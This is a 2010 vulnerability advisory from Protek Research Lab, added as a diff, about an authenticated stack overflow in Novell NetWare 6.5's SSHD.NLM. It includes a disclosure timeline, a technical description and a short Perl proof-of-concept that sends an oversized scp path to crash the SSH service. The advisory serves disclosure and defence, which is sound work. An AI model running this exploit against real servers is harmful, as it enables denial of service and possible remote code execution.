@@ -1,0 +1,135 @@
+#####################################################################################
+
+Application:   Novell Netware OpenSSH Remote Stack Overflow
+
+Platforms:  Netware 6.5
+
+Exploitation:   Remote code execution
+
+CVE Number:
+
+Novell TID:   7006756
+
+ZeroDayInitiative: ZDI-10-169
+
+Author:   Francis Provencher (Protek Research Lab's)
+
+Blog:   http://www.protekresearchlab.com/
+
+
+#####################################################################################
+
+1) Introduction
+2) Report Timeline
+3) Technical details
+4) The Code
+
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+
+Novell, Inc. is a global software and services company based in Waltham,
+Massachusetts. The company specializes in enterprise operating systems, such
+as SUSE
+
+Linux Enterprise and Novell NetWare; identity, security, and systems
+management solutions; and collaboration solutions, such as Novell Groupwise
+and Novell
+
+Pulse.
+
+Novell was instrumental in making the Utah Valley a focus for technology and
+software development. Novell technology contributed to the emergence of
+local
+
+area networks, which displaced the dominant mainframe computing model and
+changed computing worldwide. Today, a primary focus of the company is on
+developing
+
+open source software for enterprise clients.
+
+(http://en.wikipedia.org/wiki/Novell)
+
+#####################################################################################
+
+============================
+2) Report Timeline
+============================
+
+2010-04-06 The details of this case have been submitted to the vendor as
+ZDI-CAN-674.
+2010-09-01 Vendor respond with an advisory without nothing to fix the
+vulnerability.
+
+
+#####################################################################################
+
+============================
+3) Technical details
+============================
+
+This vulnerability allows remote attackers to execute arbitrary code on
+vulnerable installations of Novell Netware. Authentication is required to
+exploit
+
+this vulnerability.
+
+The flaw exists within SSHD.NLM. When the application attempts to resolve an
+absolute path on the server, a 512 byte destination buffer is used without
+
+bounds checking. By providing a large enough value, an attacker can cause a
+buffer to be overflowed. Successful exploitation results in remote code
+execution
+
+under the context of the server.
+
+#####################################################################################
+
+===========
+4) The Code
+===========
+
+
+#!/usr/bin/perl
+
+use Net::SSH2;
+use Getopt::Std;
+
+@overflow = ('A' x 1034);
+
+getopts('H:P:u:p:', \%opts);
+$host = $opts{'H'}; $port = $opts{'P'}; $username = $opts{'u'}; $password =
+$opts{'p'};
+
+if(!defined($host) || !defined($username))
+{
+     print "\nUsage: $0 -H <host> -P [port] -u <username> -p
+[password]\n\n";
+     exit(0);
+
+}
+
+
+print "\SCP Get... Beep, Beep";
+foreach(@overflow) { $ssh2 = Net::SSH2->new();
+$ssh2->connect($host, $port)               || die "\nError: Connection
+Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
+$ssh2->auth_password($username, $password) || die "\nError:
+Username/Password Denied!\n";
+$fuzzssh = $_; $scpget = $ssh2->scp_get($fuzzssh); $ssh2->disconnect(); }
+sleep(1);
+
+
+close(FD); close(FDD); close(FDDD); close(FDDDD);
+
+exit;
+
+
+
+
+
+#####################################################################################
+(PRL-2010-07)
